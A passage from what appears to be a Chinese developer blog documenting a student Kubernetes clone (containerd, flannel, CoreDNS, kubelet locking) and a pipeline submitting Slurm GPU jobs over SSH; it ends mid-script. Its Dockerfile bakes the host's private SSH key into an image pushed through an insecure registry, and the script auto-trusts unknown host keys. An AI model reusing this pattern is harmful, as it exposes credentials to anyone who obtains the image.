device</code>的错</p>\n</li>\n<li><p><code>WithDomainname</code> <code>WithHostname</code></p>\n</li>\n<li><p><code>WithLinuxNamespace</code>可以加入其他进程的namespace 但是需要先起task 拿到pid<code>proc/pid/ns/uts</code></p>\n<p>启动pause容器后，将此pod内的所有其他容器加入到pause容器的namespace<br>观察containerd的源码可知，就算什么都不配置，默认也是使用了ipc、uts、network、mount、pid这五个命名空间隔离的<br><a href=\"https://blog.csdn.net/weixin_40579389/article/details/125941366\">k8s之pause容器</a>按这篇文章的意思 除了mount其他都不需要和pause隔离<br>需要修改的话 一种是自己写配置函数，另一种是使用这个api但只能一个个单独设 </p>\n</li>\n<li><p><code>WithProcessArgs</code> 启动命令 只有windows支持<code>ProcessCmdLine</code> 不过简单的命令使用起来效果差不多，具体可能涉及到entrypoint 和cmd的区别</p>\n</li>\n<li><p><code>Withenv</code>  环境变量 <code>&quot;a=c&quot;</code> </p>\n</li>\n<li><p><code>WithMemoryLimit</code> 单位是字节，如果容器使用内存超过这个数 会被直接kill。</p>\n<p>莫名其妙会有bug，报cgroup的错，全网查不到信息，使用“30Mi” 没问题</p>\n</li>\n<li><p>CPU：</p>\n<ul>\n<li><code>WithCPUs</code> 将容器进程绑定到指定cpu执行，比如<code>0-3</code>绑定到0 1 2 3  ，<code>1</code>绑定到1</li>\n<li><code>WithCPUCFS</code> 调度器，对应到nerdctl 是<code>--cpus</code> 会使用这个api，但是网上说这个参数指定cpu核，这个说法不准确，实际上如果这个值为1，会发生cpu0 和cpu1占用率都在50%的情况，即总使用量为1</li>\n<li><code>WithCPUShares</code> 份额</li>\n</ul>\n</li>\n<li><p>port: 仅作标识用，没有意义，所以没有对应api</p>\n<p><a href=\"https://www.jianshu.com/p/4b16c995990b\">k8s四种port解析：nodePort、port、targetPort、containerPort - 简书 (jianshu.com)</a> </p>\n</li>\n<li><p><code>WithContainerLabels</code>这个功能为container提供label</p>\n<p>配合<code>client.Containers(ctx,fmt.Sprintf(&quot;labels.%q==%s&quot;, &quot;pod&quot;, pod.Data.Name))</code>一起使用</p>\n<p>对于apiserver维护的信息，只是自定义的container apiobject，并不是containerd的可以用来获取真实容器信息的对象，使用containerd的添加label并使用filter的方法可以很方便地拿到一个pod对应的所有containers，否则需要通过遍历容器并比较ID来判断。</p>\n</li>\n</ul>\n<h3 id=\"task\"><a href=\"#task\" class=\"headerlink\" title=\"task\"></a>task</h3><p>containerd的api有一个docker没有的概念task</p>\n<p>每个容器创建后，可以开启task，每个task对应一个进程，有对应的api，这时候才会产生新的命名空间</p>\n<p>删除容器，先要killtask 然后delete task 最后delete容器</p>\n<h3 id=\"image\"><a href=\"#image\" class=\"headerlink\" title=\"image\"></a>image</h3><p>containerd本身管理容器运行时，对于其他功能的提供非常少，包括拉取镜像。使用containerd提供的api只能做到从某个registry拉取，本地image是不行的，不带registry的image也是不行的。</p>\n<p>通过观察nerdctl的源码可以得到以下两个扩展：</p>\n<ol>\n<li><code>pkg/imgutil/dockerconfigresolver/dockerconfigresolver.go/New</code>可知使用docker的resolver可以做到从不同registry(包括自己部署的)拉取镜像</li>\n<li><code>pkg/imgutil/imgutil.go/GetExistingImage</code>可知containerd提供<code>NewImage</code>方法，供<code>image.Image</code>对象到<code>containerd.Image</code>的转换，这里<code>image.Image</code>可以通过<code>client.ImageService().Get(imageName)</code>来获取。虽然这里在字符串解析上也必须出现registry的部分，但是实际上不会真的pull，而是从本地获取(<code>nerdctl image list</code>可见即可)</li>\n</ol>\n<p>如果image在自己部署的registry中但还未被pull，这两种方法都是行不通的，需要自己创建docker resolver然后用WithResolver的配置去pull。这里图方便，解决方案为先用cli工具提前pull，随后紧接着用方法2获取到image对象</p>\n<h3 id=\"pause\"><a href=\"#pause\" class=\"headerlink\" title=\"pause\"></a>pause</h3><p>用containerd api设置网络特别麻烦，因此直接用nerdctl跑pause容器，并inspect拿到pid</p>\n<p>因此这里直接使用podname+”-pause”为每个pause容器命名</p>\n<p>虽然containerd的container对象只能访问.ID，而nerdctl 的 <code>--name</code> 设置的是name并不是id 但还是可以通过containerd的filter+label拿到container对象</p>\n<p>然而由于一开始pause容器利用nerdctl实现网络配置，nerdctl本身除了调用containerd的api外，自己有维护一个namestore，在创建容器时会 <code>aquire</code> 需要在销毁时 <code>release</code></p>\n<p>所以销毁容器只调containerd的api是不够的，会导致containerd的容器已经被删掉了，但是nerdctl维护的信息还没删，导致下一次创建同名pause容器会有问题</p>\n<p>解决方案可以是照nerdctl的代码找到对应的文件路径 然后照抄 <code>release</code>的代码，但这导致minik8s存在与nerdctl耦合的路径配置，较复杂 所以不如销毁pause仍用nerdctl直接实现</p>\n<h2 id=\"network\"><a href=\"#network\" class=\"headerlink\" title=\"network\"></a>network</h2><p>containerd相较于docker并没有提供任何网络相关帮助，所以完全依赖CNI插件</p>\n<p><code>nerdctl network ls</code> <code>nerdctl run -net host/none</code></p>\n<p>CNI插件完成两个目标</p>\n<ol>\n<li>让每个容器(实际上就是一个pod)拥有一个虚拟网卡，使其拥有访问外网的能力</li>\n<li>支持跨node(物理主机)的pod间通信</li>\n</ol>\n<p><a href=\"https://blog.csdn.net/weixin_41033724/article/details/124976813\">Kubernetes容器网络及Flannel插件详解_边缘计算社区的博客-CSDN博客</a></p>\n<p>思路：</p>\n<ol>\n<li>使用flannel插件创建网络 此时每个node都会出现<code>flannel.1</code>的虚拟网卡，可以互相通信</li>\n<li>使用<code>nerdctl run -net flannel pause</code> 创建pause容器，此时ip在不同node上会在不同子网中进行分配，不会重复</li>\n<li>其他容器加入pause容器的network namespace</li>\n</ol>\n<h3 id=\"flannel\"><a href=\"#flannel\" class=\"headerlink\" title=\"flannel\"></a>flannel</h3><p><a href=\"https://github.com/flannel-io/flannel/blob/master/Documentation/running.md\">flannel&#x2F;running.md at master · flannel-io&#x2F;flannel · GitHub</a></p>\n<p>flannel目前已经支持了etcd v3版本，不需要切换v2。</p>\n<p>etcd v3 v2的数据是不互通的，flanneld启动时默认会在v3里找数据</p>\n<p><a href=\"https://www.cnblogs.com/lhang/p/17306765.html\">Docker容器使用Flannel通信 - L_Hang - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_30641567/article/details/123917486\">Containerd网络管理_containerd 端口映射_班婕妤的博客-CSDN博客</a></p>\n<p>只有master节点通过apiserver使用etcd，kubelet部署在node上 不需要也不能管理etcd</p>\n<p>只需要一个etcd 不需要集群 (flannel如果使用etcd集群会出找不到lease的bug)</p>\n<p>master <code>etcd --listen-peer-urls=&quot;http://192.168.1.12:2380,http://localhost:2380&quot; --listen-client-urls=&quot;http://192.168.1.12:2379,http://localhost:2379&quot; --initial-advertise-peer-urls=&quot;http://192.168.1.12:2380,http://localhost:2380&quot; --advertise-client-urls=&quot;http://192.168.1.12:2379,http://localhost:2379&quot;</code></p>\n<p>master <code>etcdctl --endpoints &quot;http://192.168.1.12:2379&quot; put /coreos.com/network/config &#39;&#123;&quot;NetWork&quot;:&quot;10.2.0.0/16&quot;,&quot;SubnetMin&quot;:&quot;10.2.1.0&quot;,&quot;SubnetMax&quot;: &quot;10.2.20.0&quot;,&quot;Backend&quot;: &#123;&quot;Type&quot;: &quot;vxlan&quot;&#125;&#125;&#39;</code></p>\n<p>node启动<code>./flanneld-amd64 -etcd-endpoints=http://192.168.1.12:2379 -iface=ens3</code></p>\n<p>这里ens3是主机上能和外界通信的网卡，如果不设置flannel也会自动找</p>\n<p>出现<code>flannel.1</code>的网卡。如果修改配置后第一次的flannel1无法消失 出现cni0 重启可以解决</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># vim /etc/cni/net.d/10-flannel.conflist</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">&quot;name&quot;</span>: <span class=\"string\">&quot;flannel&quot;</span>,</span><br><span class=\"line\">  <span class=\"string\">&quot;cniVersion&quot;</span>: <span class=\"string\">&quot;0.3.1&quot;</span>,</span><br><span class=\"line\">  <span class=\"string\">&quot;plugins&quot;</span>: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"string\">&quot;type&quot;</span>: <span class=\"string\">&quot;flannel&quot;</span>,</span><br><span class=\"line\">      <span class=\"string\">&quot;delegate&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;isDefaultGateway&quot;</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"string\">&quot;type&quot;</span>: <span class=\"string\">&quot;portmap&quot;</span>,</span><br><span class=\"line\">      <span class=\"string\">&quot;capabilities&quot;</span>: &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;portMappings&quot;</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>nerdctl run -d -v /home/test_mount:/root/test_mount --net flannel -e port=12345 mcastelino/nettools /root/test_mount/test_network</code> 测试网络可行<br>nerdctl对于网络的解析太复杂了，对于pause并没有很多额外的配置，所以直接用ctl启动pause<br>在加入pause的namespace后发现，虽然其他容器有通过虚拟网卡向外找到合适的转发接口的能力，但是并没有DNS server。这里解决方法是使用外部的<code>nerdctl cp</code>命令将首个容器(pause)的<code>/etc/resolv.conf</code> <code>/etc/hosts</code>文件复制给每个该pod下的容器<br>容器内部部署的服务 可在主机上通过容器ip+容器内端口的方式直接访问到，至此实现pod间通信、主机与pod通信，后续交给kube-proxy</p>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p><a href=\"https://blog.csdn.net/weixin_43266367/article/details/127836595\">k8s网络插件之Flannel_林凡修的博客-CSDN博客</a></p>\n<h3 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h3><p>由于需要给pod增加dns服务，在master上使用coredns作为dns server，解决方法是在resolve.conf中第一条加入master节点的ip（必须53端口）</p>\n<p>resolv.conf的逻辑是 如果前一个nameserver连接不上，才会继续向下一个nameserver查找。</p>\n<p>如果前一个nameserver连接上了但是没有记录，则会直接报无记录，不会向下一个nameserver查找。</p>\n<p>因此必须保证在集群网络通常的情况下，master节点必须启用coredns并且coredns除了minik8s需要的dns服务，必须包括其他通用的dns服务。</p>\n<h2 id=\"资源监控\"><a href=\"#资源监控\" class=\"headerlink\" title=\"资源监控\"></a>资源监控</h2><p>参考<code>cmd/nerdctl/container_stats_linux.go</code></p>\n<p>可以通过containerd的api拿到metrics对象,不过需要Unmarshal，并且对应的接口离其报错，找不到type，只能照着containerd的源码手动用反射</p>\n<h3 id=\"memory\"><a href=\"#memory\" class=\"headerlink\" title=\"memory\"></a>memory</h3><p>是一个定值，表示占用内存大小，单位byte</p>\n<h3 id=\"CPU\"><a href=\"#CPU\" class=\"headerlink\" title=\"CPU\"></a>CPU</h3><p>进程创建开始之后累计执行的时间，如果跑在2个核上，过了1s，则记为2s<br>通过与上一次获取的cpu执行时间的delta和时间delta可以计算出CPUPercent，和top展示的cpu%是一模一样的<br>CPUPercent和容器创建指定的cpu参数可对应，例如指定cpu&#x3D;1，则cpu%&#x3D;100%;cpu&#x3D;2,cpu%&#x3D;200%（两核跑满）;cpu&#x3D;500m,cpu%&#x3D;50%</p>\n<h2 id=\"其他-1\"><a href=\"#其他-1\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>kubelet主要做三件事</p>\n<ol>\n<li>websocket与apiserver保持长连接，监听到pod的创建、销毁状态时进行对应的容器操作。</li>\n<li>作为http server接收对于容器资源的请求，获取并计算容器资源后返回。</li>\n<li>每隔一段时间检查所有容器的状态，将存在停止容器的pod的状态通过短链接更新给apiserver</li>\n</ol>\n<p>针对container，1是写，23是读，可能会发生冲突。例如操作2正在统计某容器资源的时候，该容器被操作1删除。</p>\n<p>使用读写锁为每个pod上锁，即<code>map[string]sync.RWMutex</code> 其中key为<code>namespace-podname</code> 锁必须细粒度，因为2操作非常慢。</p>\n<p>go的map本身是线程不安全的，在对于同一个pod同时拿锁时可能创建两个不同的锁，严重时可能导致对于map的修改崩溃，因此将map替换为<code>sync.Map</code>。虽然同时写map没问题，但是很可能出现t1创建完并拿完锁之后return t2再次创建并拿锁，原因是并没有另一把锁来让对于map中某个key的访问设为临界区。使用<code>sync.Map</code>提供的<code>LoadOrStore(key,value)</code>方法，它会先判断是否存在某个key，如果存在返回<code>map[key]</code>，否则设置<code>map[key]=value</code>后返回value，最后用value.lock。这个方法只是压缩代码行数到了两行，但仍然不是原子的。最好是有类似<code>tbb::concurrent_hash_map::accessor</code>之类的东西。</p>\n<p>解决方法是使用一把大锁保护<code>sync.Map</code>，每次写map都需要拿锁，虽然粒度从pod变大到了整个空间，但是这里锁保护的临界区非常小，之后对于map数据结构的写，很快。</p>\n<p>在和apiserver连接中断后，任务2会继续做，任务1会每5s再发起一次连接请求，任务3会按之前的频率继续做(由于get请求会失败所以拿不到pod信息)</p>\n","categories":["misc"]},{"title":"GPU","url":"/2024/09/17/misc/GPU/","content":"<h1 id=\"GPU\"><a href=\"#GPU\" class=\"headerlink\" title=\"GPU\"></a>GPU</h1><h2 id=\"交我算平台\"><a href=\"#交我算平台\" class=\"headerlink\" title=\"交我算平台\"></a>交我算平台</h2><p><a href=\"https://docs.hpc.sjtu.edu.cn/job/slurm.html\">Slurm 作业调度系统 — 上海交大超算平台用户手册 文档 (sjtu.edu.cn)</a></p>\n<p><a href=\"https://docs.hpc.sjtu.edu.cn/job/dgx.html\">AI平台使用文档 — 上海交大超算平台用户手册 文档 (sjtu.edu.cn)</a></p>\n<p><a href=\"https://docs.hpc.sjtu.edu.cn/job/jobsample2.html#cuda\">作业示例（开发者） — 上海交大超算平台用户手册 文档 (sjtu.edu.cn)</a></p>\n<p><code>srun -p dgx2 -N 1 -n 1 --gres=gpu:1 --cpus-per-task=6 --pty /bin/bash</code>直接进计算节点</p>\n<p><code>sbatch xx.slurm</code>提交</p>\n<p><code>squeue</code>查看未执行</p>\n<p><code>sacct</code>查看任务</p>\n<h2 id=\"NFS\"><a href=\"#NFS\" class=\"headerlink\" title=\"NFS\"></a>NFS</h2><h3 id=\"master\"><a href=\"#master\" class=\"headerlink\" title=\"master\"></a>master</h3><p><code>apt-get install -y nfs-kernel-server</code></p>\n<p><code>/etc/exports</code>最后<code>/minik8s-sharedata *(rw,sync,no_subtree_check)</code></p>\n<p><code>/etc/init.d/nfs-kernel-server restart</code></p>\n<h3 id=\"node\"><a href=\"#node\" class=\"headerlink\" title=\"node\"></a>node</h3><p><code>apt-get install -y nfs-common</code></p>\n<p><code>mount master:/minik8s-sharedata /minik8s-sharedata</code></p>\n<p>master节点创建的文件&#x2F;文件夹在node节点readonly</p>\n<h2 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h2><h3 id=\"主机与容器\"><a href=\"#主机与容器\" class=\"headerlink\" title=\"主机与容器\"></a>主机与容器</h3><p>通过查询相关资料，发现job的数据是只能通过与主机挂载目录完成的。master节点提交任务，最终跑在node节点，如何共享文件。</p>\n<ol>\n<li>把gpu的job yaml放在master节点，cu和Makefile放在node节点，且为该node节点加上gpu标签，yaml中的nodeselector加此标签。 这种方式把node暴露给用户，不合适。</li>\n<li>集群部署docker registry，master节点build一个镜像，然后node节点pull。这样可以获得上传的文件，但是无法把结果拿给master。</li>\n<li>NFS。master和node通过nfs，共享<code>/minik8s-sharedata</code>文件夹</li>\n</ol>\n<p>yaml文件挂载容器目录与主机共享文件夹，用环境变量指定参数和gpu文件</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Pod</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">gpu-job</span></span><br><span class=\"line\">  <span class=\"attr\">namespace:</span> <span class=\"string\">gpu</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">containers:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">gpu-server</span></span><br><span class=\"line\">      <span class=\"attr\">image:</span> <span class=\"string\">gpu-server</span></span><br><span class=\"line\">      <span class=\"attr\">command:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"string\">&quot;./job.py&quot;</span></span><br><span class=\"line\">      <span class=\"attr\">env:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">source-path</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">/gpu</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">job-name</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">gpu-matrix</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">partition</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">dgx2</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">&quot;N&quot;</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">ntasks-per-node</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">cpus-per-task</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">&quot;6&quot;</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">gres</span></span><br><span class=\"line\">          <span class=\"attr\">value:</span> <span class=\"string\">gpu:1</span></span><br><span class=\"line\">      <span class=\"attr\">volumeMounts:</span></span><br><span class=\"line\">        <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">share-data</span></span><br><span class=\"line\">          <span class=\"attr\">mountPath:</span> <span class=\"string\">/gpu</span></span><br><span class=\"line\">  <span class=\"attr\">volumes:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">share-data</span></span><br><span class=\"line\">      <span class=\"attr\">hostPath:</span></span><br><span class=\"line\">        <span class=\"attr\">path:</span> <span class=\"string\">/minik8s-sharedata/gpu/matrix</span></span><br></pre></td></tr></table></figure>\n\n<p>注意这里N是个奇怪的关键字，必须加引号否则会解析错误</p>\n<p>容器把用户提供的source文件夹（包括代码文件和Makefile）整个上传到hpc服务器，以job-name命名，并本地生成slurm也上传到这个目录。要求用户代码将需要生成的文件放入source&#x2F;result中，并且一定要提前创建好，slurm会将程序的标准输入输出也放入source&#x2F;result中，最后可在主机的共享文件夹中拿到结果。</p>\n<p>用户可以灵活地自由添加任意源文件，只需要提供Makefile。规定的只有两点：</p>\n<ol>\n<li>用户代码需要把生成的文件存到同目录下result子目录中</li>\n<li>用户需要配置make build和make run两个命令</li>\n</ol>\n<h3 id=\"主机与hpc服务器\"><a href=\"#主机与hpc服务器\" class=\"headerlink\" title=\"主机与hpc服务器\"></a>主机与hpc服务器</h3><p>交大云主机<code>ssh-keygen -t rsa</code>为本机生成rsa公私钥</p>\n<p><code>ssh-copy-id stu1648@pilogin.hpc.sjtu.edu.cn</code>将交大云主机公钥添加到hpc登陆节点的authorized_keys中</p>\n<p>输入密码，添加成功</p>\n<p>之后ssh scp均无须密码，不需要把密码硬编码在代码中，安全</p>\n<h3 id=\"容器与hpc服务器\"><a href=\"#容器与hpc服务器\" class=\"headerlink\" title=\"容器与hpc服务器\"></a>容器与hpc服务器</h3><h4 id=\"build\"><a href=\"#build\" class=\"headerlink\" title=\"build\"></a>build</h4><p>所有node节点提前build镜像</p>\n<p>可以用<code>nerdctl tag gpu-server master:5000/gpu-server</code></p>\n<p><code>nerdctl push/pull master:5000/gpu-server --insecure-registry</code></p>\n<p>containerd的镜像与docker不共享 不可以用<code>docker build</code>（或者通过docker registry中转）</p>\n<p>如果用<code>nerdctl build</code> 需要存在<code>buildctl</code>(任意路径可调用)与<code>buildkitd</code>(提前跑的后台进程)<a href=\"https://github.com/moby/buildkit/\">Releases · moby&#x2F;buildkit (github.com)</a></p>\n<p>需要为容器创建.ssh目录放入主机的rsa私钥和known_hosts文件，便于不需要输yes和输密码</p>\n<figure class=\"highlight dockerfile\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> ubuntu</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt-get update</span></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> apt-get -y install openssh-server python3-pip vim</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> pip3 install paramiko scp</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> /root</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">mkdir</span>  .ssh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> ./id_rsa .ssh/id_rsa</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> ./known_hosts .ssh/known_hosts</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> ./job.py job.py</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><code>nerdctl build -t gpu-server .</code></p>\n<p><code>scp stu1648@data.hpc.sjtu.edu.cn:~/test_gpu.cu .</code></p>\n<p>仅使用shell命令只能做到文件传输，无法向远程主机发送需要执行的指令</p>\n<p>解决方法是使用expect或具有ssh功能的语言编写程序</p>\n<h4 id=\"expect\"><a href=\"#expect\" class=\"headerlink\" title=\"expect\"></a>expect</h4><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/usr/bin/expect -f</span></span><br><span class=\"line\">spawn bash -c &quot;ssh stu1648@pilogin.hpc.sjtu.edu.cn&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">set timeout 6</span><br><span class=\"line\">expect &quot;stu1648@pilogin*&quot;</span><br><span class=\"line\">send &quot;mkdir abc\\r&quot;</span><br><span class=\"line\">expect &quot;stu1648@pilogin*&quot;</span><br><span class=\"line\">send &quot;exit\\r&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">expect eof</span><br></pre></td></tr></table></figure>\n\n<p>expect正如名字所表达的，必须对服务端返回值在有限范围内进行预测，这是做不到从服务端拿到sbatch的返回值job_id的，故根据sacct或squeue查看job情况也无法完成，只能实现比较简单的提交任务操作。</p>\n<h4 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h4><p>使用python，可以不需要提前编译</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> paramiko</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\"><span class=\"keyword\">from</span> scp <span class=\"keyword\">import</span> SCPClient</span><br><span class=\"line\"><span class=\"keyword\">from</span> os <span class=\"keyword\">import</span> getenv</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">NREAD = <span class=\"number\">100000</span></span><br><span class=\"line\">ssh = paramiko.SSHClient()</span><br><span class=\"line\">ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class=\"line\">ssh.connect(<span class=\"string\">&quot;pilogin.hpc.sjtu.edu.cn&quot;</span>,<span class=\"number\">22</span>,<span class=\"string\">&quot;stu1648&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">job_submit_tag = <span class=\"string\">&quot;Submitted batch job&quot;</span></span><br><span class=\"line\">line_finish_tag = <span class=\"string\">&quot;[stu1648@&quot;</span></span><br><span class=\"line\">PENDING = <span class=\"string\">&quot;PENDING&quot;</span></span><br><span class=\"line\">COMPLETED = <span class=\"string\">&quot;COMPLETED&quot;</span></span><br><span class=\"line\">FAILED = <span class=\"string\">&quot;FAILED&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">source_path = getenv(<span class=\"string\">&quot;source-path&quot;</span>)</span><br><span class=\"line\">job_name = getenv(<span class=\"string\">&quot;job-name&quot;</span>)</span><br><span class=\"line\">partition= getenv(<span class=\"string\">&quot;partition&quot;</span>)</span><br><span class=\"line\">N = getenv(<span class=\"string\">&quot;N&quot;</span>)</span><br><span class=\"line\">ntasks_per_node = getenv(<span class=\"string\">&quot;ntasks-per-node&quot;</span>)</span><br><span class=\"line\">cpus_per_task = getenv(<span class=\"string\">&quot;cpus-per-task&quot;</span>)</span><br><span class=\"line\">gres = getenv(<span class=\"string\">&quot;gres&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> job_name <span class=\"keyword\">or</span> <span class=\"keyword\">not</span> source_path:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;env error&quot;</span>)</span><br><span class=\"line\">    exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> source_path[-<span class=\"number\">1</span>] == <span class=\"string\">&quot;/&quot;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># scp send whole source</span></span><br><span class=\"line\">    source_path = source_path[:-<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> partition:</span><br><span class=\"line\">    partition = <span class=\"string\">&quot;dgx2&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> N:</span><br><span class=\"line\">    N = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> ntasks_per_node:</span><br><span class=\"line\">    ntasks_per_node = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> cpus_per_task:</span><br><span class=\"line\">    cpus_per_task = <span class=\"number\">6</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> gres:</span><br><span class=\"line\">    gres = <span class=\"string\">&quot;gpu:1&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_slurm</span>():</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;generating slurm&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">f&quot;./<span class=\"subst\">&#123;job_name&#125;</span>.slurm&quot;</span>,<span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;#!/bin/bash\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --job-name=<span class=\"subst\">&#123;job_name&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --partition=<span class=\"subst\">&#123;partition&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH -N <span class=\"subst\">&#123;N&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --ntasks-per-node=<span class=\"subst\">&#123;ntasks_per_node&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --cpus-per-task=<span class=\"subst\">&#123;cpus_per_task&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --gres=<span class=\"subst\">&#123;gres&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># result must exist . is the same dir as .slurm</span></span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --output=result/output.txt\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;#SBATCH --error=result/error.txt\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;ulimit -s unlimited\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">f&quot;ulimit -l unlimited\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;module load gcc/8.3.0 cuda/10.1.243-gcc-8.3.0\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;make build\\n&quot;</span>)</span><br><span class=\"line\">        f.write(<span class=\"string\">&quot;make run\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">upload_source</span>():</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;uploading 